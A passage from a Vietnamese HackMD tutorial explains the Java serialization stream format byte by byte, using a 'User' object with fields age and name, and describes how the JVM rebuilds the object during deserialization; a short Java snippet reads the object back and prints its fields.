</ul><blockquote class="part" data-startline="145" data-endline="147" style="border-left-color: rgb(30, 144, 255);">
<p data-position="9380" data-size="0"><span class="color" data-color="#1e90ff" data-position="0" data-size="15"></span><span data-position="9395" data-size="68">AC ED: STREAM_MAGIC. Chỉ định rằng đây là một giao thức serialization</span><br>
<span data-position="9467" data-size="56">00 05: STREAM_VERSION. Đây là phiên bản của serialization</span><br>
<span data-position="9527" data-size="54">0x73: TC_OBJECT. Chỉ định rằng đây là một đối tượng mới</span></p>
</blockquote><p class="part" data-startline="149" data-endline="149" data-position="9584" data-size="0"><span data-position="9584" data-size="208">Bước đầu tiên của thuật toán serialization là viết mô tả của lớp được liên kết với một đối tượng. Ở ví dụ trên ta thấy được thuật toán bắt đầu với SerialTest để chúng ta biết được tên class, serialVersionUID.</span></p><blockquote class="part" data-startline="150" data-endline="155" style="border-left-color: rgb(30, 144, 255);">
<p data-position="9795" data-size="0"><span class="color" data-color="#1e90ff" data-position="0" data-size="15"></span><span data-position="9810" data-size="52"> 0x72: TC_CLASSDESC. Chỉ định rằng đây là một lớp mới</span><br>
<span data-position="9866" data-size="25">00 04: Độ dài của tên lớp</span><br>
<span data-position="9894" data-size="31">55 73 65 72: User, tên của lớp.</span><br>
<span data-position="9928" data-size="111">1C 54 11 43 62 88 06 36: serialVersionUID, định danh phiên bản serialization của lớp này là 0x1C54114362880636.</span><br>
<span data-position="10042" data-size="85">0x02:  Various flags. Cờ này nói rằng đối tượng hỗ trợ serialization.(SC_SERIALIZABLE)</span><br>
<span data-position="10131" data-size="36">00 02: Số trường trong lớp này là 2.</span></p>
</blockquote><p class="part" data-startline="157" data-endline="157" data-position="10169" data-size="0"><span data-position="10169" data-size="69">Tiếp theo, thuật toán sẽ viết mô tả cho trường int age = 20(Field #1)</span></p><blockquote class="part" data-startline="158" data-endline="160" style="border-left-color: rgb(30, 144, 255);">
<p data-position="10241" data-size="0"><span class="color" data-color="#1e90ff" data-position="0" data-size="15"></span><span data-position="10256" data-size="61"> 0x49: Mã loại trường: 49 đại diện cho "I", viết tắt của Int.</span><br>
<span data-position="10320" data-size="32">00 03: Chiều dài của tên trường.</span><br>
<span data-position="10355" data-size="30">61 67 65: age, tên của trường.</span></p>
</blockquote><p class="part" data-startline="162" data-endline="162" data-position="10387" data-size="0"><span data-position="10387" data-size="71">Và sau đó thuật toán viết mô tả trường tiếp theo là name=endy(Field #2)</span></p><blockquote class="part" data-startline="163" data-endline="174" style="border-left-color: rgb(30, 144, 255);">
<p data-position="10461" data-size="0"><span class="color" data-color="#1e90ff" data-position="0" data-size="15"></span><span data-position="10476" data-size="43"> 0x4C : 'L' mã kiểu field object/reference.</span><br>
<span data-position="10522" data-size="32">00 04: Chiều dài tên trường = 4.</span><br>
<span data-position="10557" data-size="34">6E 61 6D 65: name, tên của trường.</span><br>
<span data-position="10594" data-size="57">0x74: TC_STRING – bắt đầu chữ ký JVM của field kiểu object</span><br>
<span data-position="10655" data-size="24">00 12: Độ dài chuỗi = 18</span><br>
<span data-position="10682" data-size="108">4C 6A 61 76 61 2F 6C 61 6E 67 2F 53 74 72 69 6E 67 3B: Chữ ký JVM chuẩn cho String class(Ljava/lang/String;)</span><br>
<span data-position="10793" data-size="51">0x78: TC_ENDBLOCKDATA. Kết thúc block dữ liệu mô tả.</span><br>
<span data-position="10848" data-size="118">0x70: TC_NULL. Đại diện cho thực tế là không còn lớp cha phía trên nữa vì ta đã đạt đến đỉnh của hệ thống phân cấp lớp.</span><br>
<span data-position="10970" data-size="44">00 00 00 14: giá trị của field int age = 20.</span><br>
<span data-position="11017" data-size="54">0x74: TC_STRING. Tạo chuỗi mới giá trị của trường name.</span><br>
<span data-position="11075" data-size="30">00 04: Độ dài của trường name.</span><br>
<span data-position="11108" data-size="44">65 6E 64 79: "endy", giá trị của trường name</span></p>
</blockquote><h5 class="part" data-startline="176" data-endline="176" id="Quá-trình-deserialization-trong-java-diễn-ra-như-thế-nào" data-id="Quá-trình-deserialization-trong-java-diễn-ra-như-thế-nào"><a class="anchor hidden-xs" href="https://hackmd.io/@nhat015/HktihBmLxl#Qu%C3%A1-tr%C3%ACnh-deserialization-trong-java-di%E1%BB%85n-ra-nh%C6%B0-th%E1%BA%BF-n%C3%A0o" title="Quá-trình-deserialization-trong-java-diễn-ra-như-thế-nào" data-size="56" data-position="11160" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="11160" data-size="56">Quá trình deserialization trong java diễn ra như thế nào</span></h5><p class="part" data-startline="177" data-endline="178" data-position="11217" data-size="0"><span data-position="11217" data-size="198">Sau khi biết được chi tiết quá trình serilaization hoạt động rồi, giờ chúng ta sẽ đi ngược lại quá trình đó diễn ra như thế nào và biết được tại sao  JVM tạo được đối tượng mà không gọi constructor.</span><br>
<span data-position="11416" data-size="23">Đây là cách nó diễn ra:</span></p><ul class="part" data-startline="179" data-endline="186" data-position="11440" data-size="0">
<li class="" data-startline="179" data-endline="179" data-position="11442" data-size="0"><span data-position="11442" data-size="132">Bất kì lớp cha nào của đối tượng phải serializable và nếu không serializable thì phải tồn tại constructor mặc định (không tham số ).</span></li>
<li class="" data-startline="180" data-endline="180" data-position="11577" data-size="0"><span data-position="11577" data-size="215">Trong quá trình deserializaion, lớp cha của lớp chứa đối tượng sẽ được tìm kiếm đầu tiên cho đến khi tìm thấy 1 lớp không được serializable và tồn tại constructor mặc định. JVM sẽ khởi tạo đối tượng rỗng của lớp đó.</span></li>
<li class="" data-startline="181" data-endline="181" data-position="11795" data-size="0"><span data-position="11795" data-size="103">Nếu tất cả các lớp cha đều được serializble thì JVM sẽ tiếp cận lớp Object và tạo đối tượng của lớp đó.</span></li>
<li class="" data-startline="182" data-endline="182" data-position="11901" data-size="0"><span data-position="11901" data-size="93">Sau khi gọi constructor mặc định của lớp đó JVM sẽ không gọi bất kì constructor nào khác nữa.</span></li>
<li class="" data-startline="183" data-endline="183" data-position="11997" data-size="0"><span data-position="11997" data-size="191">Sau khi tạo đối tượng rỗng, JVM sẽ thiết lập trường static của nó trước, sau đó đọc chuỗi byte và sử dụng metadata của lớp để thiết lập kiểu dữ liệu cũng như các thông tin khác của đối tượng.</span></li>
<li class="" data-startline="184" data-endline="184" data-position="12191" data-size="0"><span data-position="12191" data-size="187">Tiếp theo JVM gọi phương thức readObject() mặc định(nếu chưa bị ghi đè ngược lại sẽ gọi phương thức readObject() đã được ghi đè ) có nhiệm vụ đặt các giá trị từ byte stream vào đối tượng.</span></li>
<li class="" data-startline="185" data-endline="186" data-position="12381" data-size="0"><span data-position="12381" data-size="119">Sau khi readObject() hoàn thành thì đối tượng mới được tạo ra. Lưu í cần phải ép kiểu về đối tượng chúng ta serialized.</span></li>
</ul><p class="part" data-startline="187" data-endline="187" data-position="12502" data-size="0"><span data-position="12502" data-size="93">Nếu áp dụng với ví dụ trên thì sau khi quá trình Serialize rồi thì Deserialize nó sẽ như này:</span></p><ul class="part" data-startline="188" data-endline="188" data-position="12596" data-size="0">
<li class="" data-startline="188" data-endline="188" data-position="12598" data-size="0"><span data-position="12598" data-size="23">JVM đọc phần đầu stream</span></li>
</ul><blockquote class="part" data-startline="189" data-endline="190" style="border-left-color: rgb(30, 144, 255);">
<p data-position="12624" data-size="0"><span class="color" data-color="#1e90ff" data-position="0" data-size="15"></span><span data-position="12639" data-size="68">AC ED: STREAM_MAGIC – báo hiệu đây là một file serialized Java object</span><br>
<span data-position="12709" data-size="55">00 05: STREAM_VERSION – version 5 của Java Serialization</span></p>
</blockquote><ul class="part" data-startline="191" data-endline="191" data-position="12766" data-size="0">
<li class="" data-startline="191" data-endline="191" data-position="12768" data-size="0"><span data-position="12768" data-size="60">JVM gặp TC_OBJECT → biết rằng đang deserialize một object mới</span></li>
</ul><blockquote class="part" data-startline="192" data-endline="192" style="border-left-color: rgb(30, 144, 255);">
<p data-position="12832" data-size="0"><span class="color" data-color="#1e90ff" data-position="0" data-size="15"></span><span data-position="12847" data-size="14">0x73: TC_OBJECT</span></p>
</blockquote><ul class="part" data-startline="193" data-endline="193" data-position="12863" data-size="0">
<li class="" data-startline="193" data-endline="193" data-position="12865" data-size="0"><span data-position="12865" data-size="48">JVM gặp TC_CLASSDESC → mô tả class được serialize</span></li>
</ul><blockquote class="part" data-startline="194" data-endline="199" style="border-left-color: rgb(30, 144, 255);">
<p data-position="12917" data-size="0"><span class="color" data-color="#1e90ff" data-position="0" data-size="15"></span><span data-position="12932" data-size="17">0x72: TC_CLASSDESC</span><br>
<span data-position="12951" data-size="34">00 04: độ dài tên class là 4 bytes</span><br>
<span data-position="12986" data-size="25">55 73 65 72: ASCII = User</span><br>
<span data-position="13012" data-size="56">1C 54 11 43 62 88 06 36: serialVersionUID của class User</span><br>
<span data-position="13069" data-size="47">0x02: Flags – class này implements Serializable</span><br>
<span data-position="13117" data-size="25">00 02: số lượng field = 2</span></p>
</blockquote><ul class="part" data-startline="200" data-endline="200" data-position="13143" data-size="0">
<li class="" data-startline="200" data-endline="200" data-position="13145" data-size="0"><span data-position="13145" data-size="31">JVM đọc metadata của từng field</span></li>
</ul><blockquote class="part" data-startline="201" data-endline="210" style="border-left-color: rgb(30, 144, 255);">
<p data-position="13179" data-size="0"><span class="color" data-color="#1e90ff" data-position="0" data-size="15"></span><span data-position="13194" data-size="8">Field 1:</span><br>
<span class="color" data-color="#1e90ff" data-position="26" data-size="15"></span><span data-position="13220" data-size="21">0x49: mã kiểu I – int</span><br>
<span data-position="13243" data-size="27">00 03: độ dài tên field = 3</span><br>
<span data-position="13272" data-size="16">61 67 65 → "age"</span><br>
<span data-position="13289" data-size="8">Field 2:</span><br>
<span class="color" data-color="#1e90ff" data-position="121" data-size="15"></span><span data-position="13315" data-size="24">0x4C: mã kiểu L – object</span><br>
<span data-position="13340" data-size="27">00 04: độ dài tên field = 4</span><br>
<span data-position="13368" data-size="20">6E 61 6D 65 → "name"</span><br>
<span data-position="13389" data-size="41">0x74 00 12 → TC_STRING với độ dài 18 bytes</span><br>
<span data-position="13432" data-size="76">4C 6A 61 76 61 2F 6C 61 6E 67 2F 53 74 72 69 6E 67 3B → "Ljava/lang/String;"</span></p>
</blockquote><ul class="part" data-startline="211" data-endline="211" data-position="13509" data-size="0">
<li class="" data-startline="211" data-endline="211" data-position="13511" data-size="0"><span data-position="13511" data-size="32">JVM gặp TC_ENDBLOCKDATA và TC_NULL</span></li>
</ul><blockquote class="part" data-startline="212" data-endline="213" style="border-left-color: rgb(30, 144, 255);">
<p data-position="13548" data-size="0"><span class="color" data-color="#1e90ff" data-position="0" data-size="15"></span><span data-position="13563" data-size="37">0x78: kết thúc block dữ liệu metadata</span><br>
<span data-position="13601" data-size="66">0x70: không có superclass (ngoài Object, vốn không được serialize)</span></p>
</blockquote><ul class="part" data-startline="214" data-endline="219" data-position="13668" data-size="0">
<li class="" data-startline="214" data-endline="219" data-position="13670" data-size="0"><span data-position="13670" data-size="27">JVM khởi tạo đối tượng User</span><br>
<strong data-position="13698" data-size="0"><span data-position="13700" data-size="11">Giai đoạn 1</span></strong><span data-position="13714" data-size="17">: Tạo object rỗng</span><br>
<span data-position="13731" data-size="62">Vì User implements Serializable, nên JVM sẽ bỏ qua constructor</span><br>
<span data-position="13794" data-size="124">JVM tìm đến lớp cha không serializable (trong trường hợp này là Object) và gọi default constructor của Object để tạo object.</span><br>
<strong data-position="13919" data-size="0"><span data-position="13921" data-size="11">Giai đoạn 2</span></strong><span data-position="13935" data-size="24">: Ghi dữ liệu vào object</span><br>
<span data-position="13959" data-size="21">JVM đọc tiếp dữ liệu:</span></li>
</ul><blockquote class="part" data-startline="220" data-endline="222" style="border-left-color: rgb(30, 144, 255);">
<p data-position="13983" data-size="0"><span class="color" data-color="#1e90ff" data-position="0" data-size="15"></span><span data-position="13998" data-size="37">00 00 00 14  → 20 (giá trị của field </span><code data-position="14036" data-size="3">age</code><span data-position="14040" data-size="1">)</span><br>
<span data-position="14042" data-size="34">0x74 00 04 → TC_STRING có độ dài 4:</span><br>
<span data-position="14078" data-size="45">65 6E 64 79 → "endy" → giá trị của field name</span></p>
</blockquote><ul class="part" data-startline="224" data-endline="224" data-position="14125" data-size="0">
<li class="" data-startline="224" data-endline="224" data-position="14127" data-size="0"><span data-position="14127" data-size="28">Kết quả sau deserialization:</span></li>
</ul><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="225" data-endline="229" data-infoprefix-length="4" data-position="14156"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="java hljs"><span class="token class-name">User</span> deserializedObject <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">User</span><span class="token punctuation">)</span> objectIn<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Name: "</span> <span class="token operator">+</span> deserializedObject<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// endy</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Age: "</span> <span class="token operator">+</span> deserializedObject<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 20</span>
</code></pre>
      </div><p class="part" data-startline="230" data-endline="230" data-position="14360" data-size="0"><span data-position="14360" data-size="10">Tham khảo:</span><a href="https://www.infoworld.com/article/2072752/the-java-serialization-algorithm-revealed.html" target="_blank" rel="noopener"><span data-position="14371" data-size="41">The Java serialization algorithm revealed</span></a><span data-position="14504" data-size="2">, </span><a href="https://docs.oracle.com/javase/specs/jvms/se9/html/jvms-4.html" target="_blank" rel="noopener"><span data-position="14506" data-size="6">Oracle</span></a></p><h4 class="part" data-startline="232" data-endline="232" id="24-Serialize-data" data-id="24-Serialize-data"><a class="anchor hidden-xs" href="https://hackmd.io/@nhat015/HktihBmLxl#24-Serialize-data" title="24-Serialize-data" data-size="18" data-position="14584" smoothhashscroll=""><span class="octicon octicon-link ph ph-link-simple-horizontal"></span></a><span data-position="14584" data-size="18">2.4 Serialize data</span></h4><p class="part" data-startline="233" data-endline="234" data-position="14603" data-size="0"><span data-position="14603" data-size="445">Nãy giờ chúng ta đã thấy được quá trình de/serialization trong java, các dữ liệu có được sau quá trình serialization và sẽ sử dụng khi bắt đầu quá trình deserialization gọi là serialize data. Chúng ta có thể không cần hiểu hết các khái niệm và định nghĩa của serialize data để biết được nội dung của nó vì bây giờ có 1 số tool sẽ làm điều đó cho chúng ta mà xí nữa mình sẽ giới thiệu, nhưng chúng ta phải biết 1 số thứ cơ bản của serialize data.</span><br>
<span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="15049" data-size="80" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/H123qX8Ugl.png" alt="file signaute trong serialize data" class="offline-handled error-handled image-toolbar-handled" data-position="15049" data-size="80" loading="lazy" style="width: auto; height: auto;"></span></p><ul class="part" data-startline="235" data-endline="241" data-position="15130" data-size="0">
<li class="" data-startline="235" data-endline="235" data-position="15132" data-size="0"><span data-position="15132" data-size="397">Đầu tiên chúng ta đến với file signature. Khi một đối tượng trong Java được tuần tự hóa (serialized) và ghi ra file hoặc truyền qua mạng, dữ liệu kết quả sẽ bắt đầu bằng một chuỗi byte đặc biệt gọi là file signature hay magic number. Đây là dấu hiệu nhận biết một luồng dữ liệu được tuần tự hóa theo chuẩn Java Serialization.(mình đã giải thích rõ hơn ở phần 2.3, ở đây mình chỉ định nghĩa cơ bản)</span></li>
<li class="" data-startline="236" data-endline="237" data-position="15532" data-size="0"><span data-position="15532" data-size="226">Signature này được sử dụng bởi Java Virtual Machine (JVM) và các công cụ phân tích để xác định và xử lý dữ liệu đã serialize. Nếu một file không có định danh này ở phần đầu, JVM sẽ không coi đó là một serialized object hợp lệ.</span><br>
<span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="15759" data-size="77" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/S1z76mUUle.png" alt="class name trong serialize data" class="offline-handled error-handled image-toolbar-handled" data-position="15759" data-size="77" loading="lazy" style="width: auto; height: auto;"></span></li>
<li class="" data-startline="238" data-endline="238" data-position="15839" data-size="0"><span data-position="15839" data-size="186">Sau phần file signature, Java Serialization stream sẽ chứa thông tin về tên lớp (class name) của đối tượng được tuần tự hóa. Phần này nằm trong Class Descriptor, mô tả lớp của đối tượng.</span></li>
<li class="" data-startline="239" data-endline="240" data-position="16029" data-size="0"><span data-position="16029" data-size="189">Thông tin class name giúp JVM biết được kiểu đối tượng đang được deserialize và đảm bảo đối tượng tái tạo đúng lớp ban đầu. Nếu không khớp tên lớp, deserialization sẽ thất bại hoặc ném lỗi </span><code data-position="16219" data-size="22">ClassNotFoundException</code><span data-position="16243" data-size="1">.</span><br>
<span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="16244" data-size="81" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/HyDj67UIge.png" alt="attribute name trong serialize data" class="offline-handled error-handled image-toolbar-handled" data-position="16244" data-size="81" loading="lazy" style="width: auto; height: auto;"></span></li>
<li class="" data-startline="241" data-endline="241" data-position="16328" data-size="0"><span data-position="16328" data-size="153">Sau khi JVM ghi tên lớp vào luồng byte trong quá trình serialize, nó tiếp tục ghi thông tin chi tiết về các thuộc tính (fields) của lớp. Mỗi field sẽ có:</span></li>
</ul><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="242" data-endline="248" data-infoprefix-length="8" data-position="16482"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="markdown hljs"><span class="hljs-operator">|</span> Thành phần                           <span class="hljs-operator">|</span> Mô tả                                                                     <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span> <span class="hljs-operator">|</span> <span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span><span class="hljs-operator">-</span> <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-operator">*</span><span class="hljs-operator">*</span>Field <span class="hljs-keyword">type</span> code<span class="hljs-operator">*</span><span class="hljs-operator">*</span>                  <span class="hljs-operator">|</span> Ký hiệu <span class="hljs-number">1</span> <span class="hljs-keyword">byte</span> đại diện cho kiểu dữ liệu (ví dụ: `I` <span class="hljs-operator">=</span> <span class="hljs-keyword">int</span>, `L` <span class="hljs-operator">=</span> object) <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-operator">*</span><span class="hljs-operator">*</span>Field name length <span class="hljs-operator">+</span> name<span class="hljs-operator">*</span><span class="hljs-operator">*</span>         <span class="hljs-operator">|</span> Độ dài và tên thuộc tính (UTF<span class="hljs-number">-8</span>)                                          <span class="hljs-operator">|</span>
<span class="hljs-operator">|</span> <span class="hljs-operator">*</span><span class="hljs-operator">*</span>Field class name<span class="hljs-operator">*</span><span class="hljs-operator">*</span> (nếu là object) <span class="hljs-operator">|</span> Tên lớp nếu field có kiểu là object                                       <span class="hljs-operator">|</span>
</code></pre>
      </div><p class="part" data-startline="249" data-endline="249" data-position="17083" data-size="0"><span class="image-toolbar-wrapper in-view inline-block w-fit h-fit [&amp;:not([data-image-error])]:cursor-zoom-in" data-position="17083" data-size="79" style="width: auto; height: auto;"><div class="code-toolbar cursor-default tw-hide md:block"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded 